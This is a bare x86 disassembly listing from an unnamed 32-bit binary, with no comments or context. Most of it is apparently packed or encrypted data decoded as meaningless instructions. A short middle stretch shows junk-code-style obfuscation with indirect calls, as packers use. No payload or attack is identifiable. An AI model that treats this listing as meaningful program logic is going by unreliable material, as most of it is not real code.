  402259:	pop    edi
  40225a:	sub    al,0x8
  40225c:	add    esi,ebx
  40225e:	sbb    al,0x80
  402260:	or     al,0x87
  402262:	add    BYTE PTR [ecx-0x3d076a81],cl
  402268:	add    al,0x8c
  40226a:	inc    ebx
  40226b:	loop   0x402298
  40226d:	or     al,0x88
  40226f:	ret    0x4839
  402272:	inc    eax
  402273:	mov    edx,0x96162097
  402278:	arpl   WORD PTR [esi],bp
  40227a:	mov    eax,0x21613948
  40227f:	push   edi
  402280:	add    dh,bh
  402282:	jno    0x4022c1
  402284:	nop
  402285:	dec    esi
  402286:	push   cs
  402287:	dec    esi
  402288:	fnstcw WORD PTR [ebx]
  40228a:	dec    ecx
  40228b:	call   0x93992910
  402290:	xchg   ecx,eax
  402291:	in     al,dx
  402292:	das    
  402293:	cs (bad) 
  402295:	mov    esi,0xa63272d8
  40229a:	fiadd  WORD PTR [ebx]
  40229c:	add    DWORD PTR [edx-0x36],0xffffffef
  4022a0:	jbe    0x4022d8
  4022a2:	sub    ebp,DWORD PTR [ebx+0x6]
  4022a5:	ins    DWORD PTR es:[edi],dx
  4022a6:	pop    es
  4022a7:	fadd   QWORD PTR [edx-0x23a22c4b]
  4022ad:	xchg   edx,eax
  4022ae:	jmp    0x402299
  4022b0:	test   cl,0x4b
  4022b3:	push   cs
  4022b4:	cdq    
  4022b5:	imul   edx,DWORD PTR [edi-0x3fc6001d],0x1c
  4022bc:	into   
  4022bd:	pop    es
  4022be:	popf   
  4022bf:	stc    
  4022c0:	sub    ebx,esp
  4022c2:	je     0x4022be
  4022c4:	and    DWORD PTR [esi*1-0x15ca7c10],ecx
  4022cb:	xchg   edx,eax
  4022cc:	ds loope 0x402270
  4022cf:	cld    
  4022d0:	ins    BYTE PTR es:[edi],dx
  4022d1:	lods   al,BYTE PTR ds:[esi]
  4022d2:	test   BYTE PTR ds:0x7bd254e1,ah
  4022d8:	jecxz  0x402273
  4022da:	or     eax,0xb5692461
  4022df:	lods   eax,DWORD PTR ds:[esi]
  4022e0:	sar    BYTE PTR ds:0x1d39731a,1
  4022e6:	xor    al,BYTE PTR [eax+0x5cde8bfb]
  4022ec:	sub    al,0xdc
  4022ee:	mul    BYTE PTR [edi+0x29]
  4022f1:	aad    0x7f
  4022f3:	inc    eax
  4022f5:	pushf  
  4022f6:	out    dx,eax
  4022f7:	adc    ebp,DWORD PTR [edi+eiz*1]
  4022fa:	cli    
  4022fb:	(bad)  
  4022fc:	stc    
  4022fd:	dec    ecx
  4022fe:	out    dx,eax
  4022ff:	push   ecx
  402300:	dec    edx
  402301:	sbb    ebp,DWORD PTR [ecx]
  402303:	fist   DWORD PTR [ecx]
  402305:	outs   dx,DWORD PTR ds:[esi]
  402306:	jns    0x40228d
  402308:	daa    
  402309:	int    0x46
  40230b:	int    0xd6
  40230d:	aad    0x50
  40230f:	xor    DWORD PTR [edx-0x55],edx
  402312:	and    BYTE PTR [ebx-0x70b30a42],al
  402318:	sti    
  402319:	jb     0x40233b
  40231b:	inc    esi
  40231c:	mov    edi,0x7fd74e3b
  402321:	mov    al,0xd3
  402323:	lock lea ecx,[eax]
  402326:	lea    esi,[esi-0x18]
  402329:	fild   WORD PTR [edx-0x53]
  40232c:	pop    ecx
  40232d:	repnz arpl WORD PTR [esi-0x3c],bp
  402331:	jo     0x40236c
  402333:	push   edi
  402334:	cs cdq 
  402336:	mov    esi,0x7953c7f3
  40233b:	bswap  ecx
  40233d:	dec    esi
  40233e:	daa    
  40233f:	mov    eax,0xdd8e0340
  402344:	jbe    0x4022ce
  402346:	inc    ebp
  402347:	int3   
  402348:	or     dl,BYTE PTR [eax]
  40234a:	push   edx
  40234b:	imul   ebx,DWORD PTR [esi-0x2fb1c0f4],0xa32d1bcd
  402355:	std    
  402356:	or     BYTE PTR [edi-0x36],bh
  402359:	cmp    bh,ch
  40235b:	sar    BYTE PTR [ecx+ebx*8+0x2266c360],cl
  402362:	and    ebx,DWORD PTR [edx]
  402364:	push   ds
  402365:	fadd   QWORD PTR [ecx]
  402367:	lods   eax,DWORD PTR ds:[esi]
  402368:	and    DWORD PTR [ebx+0x286abec7],esi
  40236e:	ficomp DWORD PTR [ecx-0x31e16625]
  402374:	test   BYTE PTR [esi],bl
  402376:	sub    ebx,DWORD PTR [ebp-0x681c593c]
  40237c:	adc    DWORD PTR [edx+0x77],eax
  40237f:	mov    ch,BYTE PTR [edi-0x57]
  402382:	cmp    DWORD PTR [edi],esi
  402384:	aaa    
  402385:	mov    dl,0x53
  402387:	out    0x13,al
  402389:	inc    edi
  40238a:	push   edi
  40238b:	adc    edi,esp
  40238d:	dec    edi
  40238e:	and    dl,ch
  402390:	jge    0xc8e0b646
  402396:	push   ebp
  402397:	inc    edi
  402398:	(bad)  
  40239a:	cmp    ebx,DWORD PTR [eax+0x50]
  40239d:	or     BYTE PTR [eiz*1+0x2d8e656e],bl
  4023a4:	add    ebx,ebx
  4023a6:	mov    cl,0x49
  4023a8:	jle    0x40234b
  4023aa:	dec    ecx
  4023ab:	inc    esi
  4023ac:	jl     0x4023fb
  4023ae:	pop    eax
  4023af:	in     eax,0xcc
  4023b1:	add    BYTE PTR [eax],dh
  4023b3:	jb     0x402424
  4023b5:	xor    DWORD PTR [edi+0x6],0x56
  4023b9:	outs   dx,DWORD PTR ds:[esi]
  4023ba:	mov    bh,0x3c
  4023bc:	loopne 0x4023f8
  4023be:	cs loopne 0x402383
  4023c1:	push   ebx
  4023c2:	mov    ch,0x75
  4023c4:	hlt    
  4023c5:	cmp    eax,0x515fd589
  4023ca:	(bad)  
  4023cb:	ficom  WORD PTR [ebx-0x44]
  4023ce:	in     eax,0x52
  4023d0:	mov    fs,WORD PTR [edx+eax*4+0x6c]
  4023d4:	jle    0x4023f0
  4023d6:	xchg   DWORD PTR [ecx+0xad9c531],esi
  4023dc:	inc    edi
  4023dd:	adc    eax,DWORD PTR [ecx+0xd]
  4023e0:	or     BYTE PTR [ecx+0x3e36bc55],bl
  4023e6:	cmp    DWORD PTR [ebx+0x46],edi
  4023e9:	repz repnz xor DWORD PTR [esi+0x2e],edx
  4023ee:	mov    ecx,esp
  4023f0:	pop    edi
  4023f1:	ret    0x6da2
  4023f4:	cli    
  4023f5:	leave  
  4023f6:	adc    esp,DWORD PTR [edx+0x5a]
  4023f9:	pop    edx
  4023fa:	or     esi,ecx
  4023fc:	fwait
  4023fd:	mov    esi,0xcb050010
  402402:	cdq    
  402403:	jns    0x402459
  402405:	jo     0x402428
  402407:	push   ss
  402408:	mov    esp,0xfd99d1bc
  40240d:	shr    bh,1
  40240f:	rcr    BYTE PTR [ecx],0xc7
  402412:	sbb    dl,BYTE PTR [edi+0x465bd68]
  402418:	sar    BYTE PTR [ebp-0x64],0x10
  40241c:	mov    WORD PTR [ecx],?
  40241e:	loopne 0x402435
  402420:	pop    edx
  402421:	inc    esp
  402422:	cs pop ebp
  402424:	mov    ch,0xda
  402426:	push   esp
  402427:	cs sar ebx,cl
  40242a:	sub    bh,BYTE PTR ds:[edx-0x69]
  40242e:	add    al,0x74
  402430:	cmp    al,BYTE PTR [ecx+0x58735e0b]
  402436:	fnstenv [eax-0x68]
  402439:	xchg   ecx,eax
  40243b:	sbb    ebp,ebx
  40243d:	sbb    al,0x80
  40243f:	daa    
  402440:	stos   BYTE PTR es:[edi],al
  402441:	ret    
  402442:	shr    BYTE PTR [ecx],0xf1
  402445:	mov    eax,edi
  402447:	es scas al,BYTE PTR es:[edi]
  402449:	outs   dx,BYTE PTR ds:[esi]
  40244a:	fcom   DWORD PTR [eax-0x30ba0f65]
  402450:	clc    
  402451:	mov    ds:0x96c11095,eax
  402456:	dec    edi
  402457:	popf   
  402458:	cmp    al,0xc6
  40245a:	sbb    bh,BYTE PTR [esi+0x1f]
  40245d:	sub    DWORD PTR [edx+0x67],esp
  402460:	jp     0x40240b
  402462:	mov    bh,0x8f
  402464:	jbe    0x40246c
  402466:	jl     0x4023f3
  402468:	jle    0x402426
  40246a:	pushf  
  40246b:	rol    DWORD PTR [ecx*8-0x6a327675],cl
  402472:	stc    
  402473:	rol    BYTE PTR [bp+si],0x5e
  402477:	psubb  mm6,QWORD PTR [esi-0x202e553]
  40247e:	push   0x6ca89410
  402483:	xor    DWORD PTR [ebx+0x222c1402],eax
  402489:	push   ds
  40248a:	or     al,0x4f
  40248c:	add    BYTE PTR [ebp-0x7732a505],dh
  402492:	aaa    
  402493:	mov    al,0x16
  402495:	js     0x4024e6
  402497:	cwde   
  402498:	(bad)  
  40249b:	rcr    edi,cl
  40249d:	scas   al,BYTE PTR es:[edi]
  40249e:	scas   eax,DWORD PTR es:[edi]
  40249f:	dec    ecx
  4024a0:	mov    edi,DWORD PTR [ebp+0x1d]
  4024a3:	outs   dx,BYTE PTR ds:[esi]
  4024a4:	mov    DWORD PTR [edx],esi
  4024a6:	je     0x402468
  4024a8:	dec    ebx
  4024a9:	pop    ecx
  4024aa:	clc    
  4024ab:	fidiv  WORD PTR [eax-0x2]
  4024ae:	dec    esp
  4024af:	mov    al,ds:0x180e9033
  4024b4:	mov    ch,0xe4
  4024b6:	cmp    dh,BYTE PTR [ecx]
  4024b8:	aad    0x8e
  4024ba:	adc    al,0xec
  4024bc:	jb     0x4024df
  4024be:	cli    
  4024bf:	push   es
  4024c0:	ja     0x4024da
  4024c2:	aam    0x2d
  4024c4:	xchg   edi,eax
  4024c5:	or     edi,DWORD PTR [ecx+eax*4+0x3f9cc6e1]
  4024cc:	mov    dh,0xae
  4024ce:	and    cl,BYTE PTR [edx+0x754426c3]
  4024d4:	popf   
  4024d5:	scas   eax,DWORD PTR es:[edi]
  4024d6:	(bad)  
  4024d7:	int3   
  4024d8:	loope  0x40251a
  4024da:	jl     0x4024a8
  4024dc:	pop    ecx
  4024dd:	mov    ebx,0x90a4469a
  4024e2:	fdivr  DWORD PTR [edx+0x2f88b8a1]
  4024e8:	mov    WORD PTR [eax],ds
  4024ea:	out    0x5,al
  4024ec:	jle    0x402470
  4024ee:	jmp    0x402568
  4024f0:	dec    esi
  4024f1:	test   DWORD PTR [eax-0x122ce48f],0x11da6698
  4024fb:	dec    ebx
  4024fc:	les    eax,FWORD PTR [edx+0x37]
  4024ff:	ja     0x40253b
  402501:	fldenv [edx-0x7d]
  402504:	jmp    0x40250e
  402506:	and    edx,ecx
  402508:	inc    ebx
  402509:	outs   dx,BYTE PTR ds:[esi]
  40250a:	mov    esp,0x83d1c858
  40250f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402510:	adc    eax,0xed6993ee
  402515:	xchg   ebx,eax
  402516:	add    al,BYTE PTR [eax+0x2b]
  402519:	ja     0x40251b
  40251b:	(bad)  
  40251d:	xchg   esi,eax
  40251e:	fild   QWORD PTR [ecx+eiz*8]
  402521:	pop    esp
  402522:	int3   
  402523:	gs clc 
  402525:	loopne 0x40259f
  402527:	xor    eax,0xc950e8e9
  40252c:	adc    al,0x5e
  40252e:	mov    ah,ch
  402530:	fstp   QWORD PTR [eax-0x9]
  402533:	push   0x3e
  402535:	jecxz  0x40257e
  402537:	cmc    
  402538:	out    dx,eax
  402539:	xchg   ebx,eax
  40253a:	xor    DWORD PTR [edi+0x2e5a2a11],eax
  402540:	lds    ebp,FWORD PTR [edx-0x2889389e]
  402546:	js     0x4025c5
  402548:	ret    
  402549:	push   eax
  40254a:	data16 sahf 
  40254c:	push   ebx
  40254d:	jno    0x40258d
  40254f:	rcl    DWORD PTR ds:0x559a3902,0x52
  402556:	push   ebx
  402557:	ror    DWORD PTR [ecx+edx*2+0x64],1
  40255b:	adc    al,BYTE PTR [edi+ebp*2-0x51]
  40255f:	push   edi
  402560:	sbb    DWORD PTR [ecx-0xa],0xab678d3b
  402567:	out    0x10,eax
  402569:	addr16 and al,0x86
  40256c:	or     DWORD PTR [bx+si+0x5757],ecx
  402571:	inc    edi
  402572:	(bad)  
  402573:	pop    ss
  402574:	xchg   ecx,eax
  402575:	dec    ebx
  402576:	pop    ecx
  402577:	or     edi,DWORD PTR [ebx-0x3b]
  40257a:	cmp    al,0xba
  40257c:	xlat   BYTE PTR ds:[ebx]
  40257d:	sub    BYTE PTR [ecx+esi*4],al
  402580:	test   al,0x3a
  402582:	ja     0x40258e
  402584:	mov    ch,0x32
  402586:	adc    ebx,DWORD PTR [edx+eiz*4-0x51294fa2]
  40258d:	arpl   bp,bp
  40258f:	mov    esi,0x30270afb
  402594:	sbb    al,0xa9
  402596:	int    0x5d
  402598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402599:	adc    dl,BYTE PTR [ebx-0x26]
  40259c:	rol    DWORD PTR [ebp+0x78d94277],cl
  4025a2:	mov    edx,0x2b7dd2d2
  4025a7:	jmp    0xdd22741
  4025ac:	psubd  mm5,QWORD PTR [esi-0x5b2464af]
  4025b3:	scas   al,BYTE PTR es:[edi]
  4025b4:	dec    edi
  4025b5:	rol    BYTE PTR [edi+0x3e],cl
  4025b8:	add    BYTE PTR [ecx],0xa1
  4025bb:	xchg   edx,eax
  4025bc:	sub    edx,DWORD PTR [esi+0x7d]
  4025bf:	out    dx,al
  4025c0:	jmp    0xb028:0x11f7247f
  4025c7:	scas   al,BYTE PTR es:[di]
  4025c9:	(bad)  [ecx]
  4025cb:	push   ss
  4025cc:	sbb    esp,edi
  4025ce:	mov    DWORD PTR [ebp-0x70],0x3b72
  4025d5:	movzx  eax,WORD PTR ds:0x42830f
  4025dc:	adc    DWORD PTR ds:0x42819b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428183,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428177,0x0
  4025fd:	mov    DWORD PTR ds:0x428323,0x76b5
  402607:	mov    DWORD PTR ds:0x42817f,edx
  40260d:	mov    DWORD PTR ds:0x428297,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428283
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428177,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42824f
  402645:	call   DWORD PTR ds:0x428dac
  40264b:	sbb    DWORD PTR ds:0x42839b,0x36f
  402655:	adc    DWORD PTR ds:0x42831f,0x4281a7
  40265f:	sub    DWORD PTR ds:0x42838f,0x42832b
  402669:	and    DWORD PTR ds:0x42816f,0x42825b
  402673:	add    DWORD PTR ds:0x42832f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428177
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42816b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42829f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282ff,edx
  4026bd:	mov    DWORD PTR ds:0x42825b,ecx
  4026c3:	mov    DWORD PTR ds:0x428183,edx
  4026c9:	mov    DWORD PTR ds:0x42827f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42816b
  4026dd:	mov    DWORD PTR ds:0x42829f,edx
  4026e3:	cmp    DWORD PTR ds:0x42829f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428db0
  402708:	add    DWORD PTR ds:0x4282a7,0x428307
  402712:	sub    DWORD PTR ds:0x428323,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42817b,0x16a6
  402726:	dec    DWORD PTR ds:0x428197
  40272c:	and    DWORD PTR ds:0x42827b,edx
  402732:	or     DWORD PTR ds:0x42830b,edx
  402738:	mov    eax,ds:0x42819f
  40273d:	and    DWORD PTR ds:0x4283b3,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x4283b3
  402751:	sbb    DWORD PTR ds:0x42827f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42825f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428313
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x4324e8aa
  4027a0:	push   0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [esi+0x31],bh
  4027ab:	(bad)  
  4027ac:	es pusha 
  4027ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027af:	jmp    0x4027b6
  4027b1:	sub    eax,DWORD PTR [ecx]
  4027b3:	lods   al,BYTE PTR ds:[esi]
  4027b4:	push   ecx
  4027b5:	mov    esi,DWORD PTR [ebp+edx*8-0x1edd772a]
  4027bc:	and    DWORD PTR [ecx-0x595e60c1],edx
  4027c2:	cmp    eax,0x7e0c60f6
  4027c7:	mov    cl,0x9c
  4027c9:	push   edx
  4027ca:	dec    ebx
  4027cb:	lods   al,BYTE PTR ds:[esi]
  4027cc:	out    0x8f,al
  4027ce:	in     al,dx
  4027cf:	inc    esi
  4027d0:	mov    ds:0x3d1143a9,eax
  4027d5:	shl    BYTE PTR [ecx],0x7
  4027d8:	rcl    DWORD PTR [edx],1
  4027da:	rcr    al,cl
  4027dc:	push   0xffffff8f
  4027de:	mov    dl,0x20
  4027e0:	inc    edi
  4027e1:	adc    ebx,edx
  4027e3:	cdq    
  4027e4:	or     DWORD PTR [edi-0x61],0xe8725e9f
  4027eb:	push   es
  4027ec:	pop    ss
  4027ed:	pop    esi
  4027ee:	xchg   edi,eax
  4027ef:	loop   0x402773
  4027f1:	mov    eax,0x6d573781
  4027f6:	stos   BYTE PTR es:[edi],al
  4027f7:	shl    BYTE PTR [ecx],1
  4027f9:	sbb    ch,BYTE PTR [esi+0x4062c5d8]
  4027ff:	mov    eax,ds:0xfa5a776b
  402804:	sub    DWORD PTR [ebx],edx
  402806:	sub    BYTE PTR [edx-0x26],0xcc
  40280a:	in     eax,0x55
  40280c:	icebp  
  40280d:	mov    ebx,0xbf0e106c
  402812:	cmp    edi,DWORD PTR [esi-0x5c]
  402815:	out    0xae,eax
  402817:	mov    dl,0x29
  402819:	fs fwait
  40281b:	sbb    ch,BYTE PTR [esi]
  40281d:	stc    
  40281e:	xor    ebx,DWORD PTR [ecx]
  402820:	stos   BYTE PTR es:[edi],al
  402821:	xor    ch,BYTE PTR [esi+ebp*8+0x326b0b4]
  402828:	popa   
  402829:	cmp    eax,ecx
  40282b:	pop    edx
  40282c:	stos   BYTE PTR es:[edi],al
  40282d:	pushf  
  40282e:	lods   al,BYTE PTR ds:[esi]
  40282f:	mov    dh,0xa0
  402831:	js     0x402876
  402833:	rcr    BYTE PTR [esi-0x69],0xd2
  402837:	out    0x89,eax
  402839:	push   ebp
  40283a:	test   al,0xbd
  40283c:	lea    edx,[ebx+eiz*4+0x70]
  402840:	sbb    edx,esp
  402842:	jbe    0x402828
  402844:	leave  
  402845:	ret    
  402846:	int    0xb2
  402848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402849:	or     DWORD PTR [ecx+0x13],0xffffffbf
  40284d:	sbb    al,0x4f
  40284f:	in     al,0x7d
  402851:	mov    ds:0xe8798cf8,eax
  402856:	fcomp  QWORD PTR [edx+0x62]
  402859:	cmp    ah,BYTE PTR [eax+0x33542a01]
  40285f:	jno    0x402808
  402861:	arpl   WORD PTR [ebp+0x20],di
  402864:	inc    eax
  402865:	mov    ebx,0xf7df6d4d
  40286a:	add    eax,0xdf5ccddb
  40286f:	push   0xffffffbc
  402871:	adc    BYTE PTR [edx+0x47],cl
  402874:	xchg   esi,eax
  402875:	cmp    eax,DWORD PTR [esi-0x2a]
  402878:	adc    bh,dh
  40287a:	fdivr  st(1),st
  40287c:	fisttp DWORD PTR [edx-0x3d]
  40287f:	pop    esp
  402880:	lds    esp,FWORD PTR [edx+0x24]
  402883:	mov    eax,0x20688313
  402888:	ret    
  402889:	fldcw  WORD PTR [ecx]
  40288b:	mov    bh,0x61
  40288d:	loope  0x4028f8
  40288f:	rcr    BYTE PTR [esi+0x34b9f0af],1
  402895:	adc    dh,bh
  402897:	sub    bl,BYTE PTR [edi-0x32a13c5d]
  40289d:	add    ebx,DWORD PTR [esi]
  40289f:	jb     0x4028d3
  4028a1:	aaa    
  4028a2:	iret   
  4028a3:	push   es
  4028a4:	and    eax,0x9b70108d
  4028a9:	cmp    al,0x5
  4028ab:	test   BYTE PTR [eax-0x1bdcd1e],dh
  4028b1:	jmp    0x5b5dbee2
  4028b6:	mov    edx,0xdaf6c961
  4028bb:	pop    edx
  4028bc:	jae    0x402856
  4028be:	cmp    BYTE PTR [eax+0x1],al
  4028c1:	mov    DWORD PTR [ecx-0x66456082],0xa877866a
  4028cb:	cdq    
  4028cc:	sbb    ah,BYTE PTR [esi]
  4028ce:	pop    ebx
  4028cf:	fs int3 
  4028d1:	test   al,0xcf
  4028d3:	loope  0x40290f
  4028d5:	sub    ebx,DWORD PTR [esi-0x13463c61]
  4028db:	(bad)  
  4028dc:	scas   al,BYTE PTR es:[edi]
  4028dd:	(bad)  
  4028de:	es xor eax,0x2621d830
  4028e4:	popf   
  4028e5:	jg     0x325a5a0f
  4028eb:	sub    eax,0x556b8c51
  4028f0:	call   0x7a9061b5
  4028f5:	retf   0x8566
  4028f8:	ins    BYTE PTR es:[edi],dx
  4028f9:	jae    0x4028b4
  4028fb:	rcl    DWORD PTR gs:[ebx-0x1],cl
  4028ff:	mov    eax,0xe65c803f
  402904:	lahf   
  402905:	ds pop ebp
  402907:	sub    al,0xc7
  402909:	mov    cl,0x4e
  40290b:	jl     0x4028ff
  40290d:	inc    edx
  40290e:	add    eax,0xbc85c362
  402913:	int3   
  402914:	push   0xf997b4ea
  402919:	sub    DWORD PTR [edx],eax
  40291b:	in     al,dx
  40291c:	sti    
  40291d:	imul   eax,DWORD PTR [eax-0x5f34b52e],0xffffffb9
  402924:	js     0x402984
  402926:	push   esi
  402927:	repnz add edi,DWORD PTR [ebx+0x3f222766]
  40292e:	adc    al,0xe2
  402930:	add    BYTE PTR [esi+0x4348a461],ah
  402936:	int3   
  402937:	jns    0x402900
  402939:	push   ebx
  40293a:	loopne 0x40291a
  40293c:	mov    ds:0xa459d57d,al
  402941:	stos   DWORD PTR es:[edi],eax
  402942:	sti    
  402943:	ret    
  402944:	or     BYTE PTR [edx+edi*8],cl
  402947:	sub    eax,0x595d77f5
  40294c:	clc    
  40294d:	shl    cl,0x66
  402950:	aaa    
  402951:	mov    edi,0x9b3f8487
  402956:	popa   
  402957:	lahf   
  402958:	or     BYTE PTR [edx-0x437e24f5],0x6e
  40295f:	pushf  
  402960:	cmp    DWORD PTR [edx+esi*1-0x2f9dca12],eax
  402967:	push   es
  402968:	add    al,0xf
  40296a:	jnp    0x4029c7
  40296c:	adc    BYTE PTR [edx-0x6748a298],dl
  402972:	stos   DWORD PTR es:[edi],eax
  402973:	cmp    DWORD PTR [eax-0xb587aad],edx
  402979:	mov    ebp,0x36f565f1
  40297e:	pop    edi
  40297f:	dec    edx
  402980:	sub    eax,eax
  402982:	sar    BYTE PTR [edx],1
  402984:	inc    ebx
  402985:	sub    DWORD PTR [ecx-0x1c11a6b3],edi
  40298b:	repnz pop ebp
  40298d:	add    DWORD PTR [edx+0x2af6f208],ecx
  402993:	out    dx,al
  402994:	xchg   ebp,eax
  402995:	push   0xd501a39d
  40299a:	sar    BYTE PTR [ecx+0x10],1
  40299d:	shl    DWORD PTR [ebx],1
  40299f:	cmp    BYTE PTR [ecx-0x3f5078af],al
  4029a5:	js     0x4029a1
  4029a7:	mov    esp,0xa4b321fd
  4029ac:	sti    
  4029ad:	pop    es
  4029ae:	sbb    eax,0x232c0e85
  4029b3:	call   0x13ca:0x4d81f9a1
  4029ba:	cdq    
  4029bb:	mov    dl,cl
  4029bd:	lods   al,BYTE PTR ds:[esi]
  4029be:	ins    BYTE PTR es:[edi],dx
  4029bf:	inc    ecx
  4029c0:	jb     0x402983
  4029c2:	jbe    0x4029b3
  4029c4:	not    dl
  4029c6:	jae    0x4029d9
  4029c8:	lgs    edi,FWORD PTR [ecx+0x13]
  4029cc:	xchg   esi,eax
  4029cd:	(bad)  
  4029ce:	fmul   DWORD PTR [ebx+0x76]
  4029d1:	ds inc esp
  4029d3:	fidiv  DWORD PTR [ecx+edi*2]
  4029d6:	pop    esi
  4029d7:	(bad)  
  4029d8:	lock mov esp,edx
  4029db:	sbb    al,0x4d
  4029dd:	scas   eax,DWORD PTR es:[edi]
  4029de:	test   al,0xea
  4029e0:	inc    esp
  4029e1:	cmp    eax,DWORD PTR fs:[edi+0x24]
  4029e5:	sub    bl,BYTE PTR [eax]
  4029e7:	jnp    0x4029ef
  4029e9:	popa   
  4029ea:	mov    al,0xcf
  4029ec:	xor    eax,0xab1f1312
  4029f1:	jns    0x402977
  4029f3:	outs   dx,DWORD PTR ds:[esi]
  4029f4:	(bad)  
  4029f5:	mov    eax,0xbd142788
  4029fa:	shl    DWORD PTR [esi+edx*8-0x652d3986],1
  402a01:	push   esi
  402a02:	(bad)  
  402a03:	ins    DWORD PTR es:[edi],dx
  402a04:	jmp    0x402a82
  402a06:	aaa    
  402a07:	cwde   
  402a08:	mov    bh,BYTE PTR [edi+0x27]
  402a0b:	lods   eax,DWORD PTR ds:[esi]
  402a0c:	mov    cl,0xa2
  402a0e:	cli    
  402a0f:	or     bh,cl
  402a11:	lds    edi,FWORD PTR [edx-0x5409c7a6]
  402a17:	jnp    0x402a8c
  402a19:	jge    0x402a52
  402a1b:	mov    ecx,0x31bdaa49
  402a20:	mov    ch,0xdd
  402a22:	bound  esp,QWORD PTR [edi-0x15]
  402a25:	ds (bad) 
  402a28:	xchg   esp,eax
  402a29:	sbb    eax,0x172619ae
  402a2e:	jge    0x402aaf
  402a30:	xchg   edx,eax
  402a31:	cmp    bh,BYTE PTR [edx-0x47]
  402a34:	sbb    al,0x1e
  402a36:	mov    BYTE PTR [ecx+0x6d3168d0],bh
  402a3c:	xchg   edx,eax
  402a3d:	(bad)  
  402a3e:	jmp    0x4029db
  402a40:	and    eax,0x2ba85304
  402a45:	int    0x16
  402a47:	stos   DWORD PTR es:[edi],eax
  402a48:	fldenv [edx+0x59e9e9ba]
  402a4e:	rol    DWORD PTR [ebp+0x68b371f1],0xa3
  402a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a56:	es sbb al,0x30
  402a59:	into   
  402a5a:	call   FWORD PTR [edi+0x36]
  402a5d:	mov    cl,0xd9
  402a5f:	jge    0x402a42
  402a61:	int    0x1a
  402a63:	xchg   ebp,eax
  402a64:	test   eax,0x4c8f8e49
  402a69:	loope  0x402ad9
  402a6b:	(bad)  
  402a6c:	mov    ds:0x14c80ac2,eax
  402a71:	nop
  402a72:	push   ebp
  402a73:	jae    0x402aac
  402a75:	popf   
  402a76:	mov    al,0xfa
  402a78:	mov    ah,0xf
  402a7a:	cmc    
  402a7b:	arpl   WORD PTR [ecx],dx
  402a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a7e:	mov    ds:0xef34ac9f,al
  402a83:	test   eax,0x69f43e44
  402a88:	sbb    al,0xe4
  402a8a:	jp     0x402a51
  402a8c:	jl     0x402b00
  402a8e:	in     al,0xf4
  402a90:	rcl    ebp,1
  402a92:	or     BYTE PTR [edi-0x1e59c095],0xc3
  402a99:	outs   dx,DWORD PTR ds:[esi]
  402a9a:	adc    al,0xbc
  402a9c:	jecxz  0x402b1a
  402a9e:	xchg   BYTE PTR [esi-0x2791f0d8],bh
  402aa4:	pop    esp
  402aa5:	mov    ecx,0xd629133d
  402aaa:	adc    eax,0xdc4bdad
  402aaf:	mov    dl,0xcc
  402ab1:	jae    0x402a8b
  402ab3:	mov    esp,0xcf83e5ed
  402ab8:	jl     0x402aff
  402aba:	mov    bh,0x77
  402abc:	mov    cs,WORD PTR [ebx]
  402abe:	dec    eax
  402abf:	push   edx
  402ac0:	push   eax
  402ac1:	es sbb eax,0x1527b36a
  402ac7:	aas    
  402ac8:	into   
  402ac9:	retf   
  402aca:	sub    esp,edx
  402acc:	(bad)  
  402acd:	cli    
  402ace:	push   0x966a1406
  402ad3:	ror    cl,cl
  402ad5:	xchg   ebp,eax
  402ad6:	sbb    BYTE PTR [edx-0x7c2555c3],ah
  402adc:	sahf   
  402add:	std    
  402ade:	sub    al,0xe5
  402ae0:	push   ebx
  402ae1:	cwde   
  402ae2:	push   edx
  402ae3:	sub    eax,0xca7f1021
  402ae8:	and    DWORD PTR [ebx+eiz*8+0x13ec3de9],esp
  402aef:	jae    0x402abd
  402af1:	out    dx,eax
  402af2:	stos   DWORD PTR es:[edi],eax
  402af3:	add    eax,DWORD PTR [ebx]
  402af5:	(bad)  
  402af6:	xor    eax,0x994d9f48
  402afb:	(bad)  
  402afc:	mov    al,ds:0x1019e482
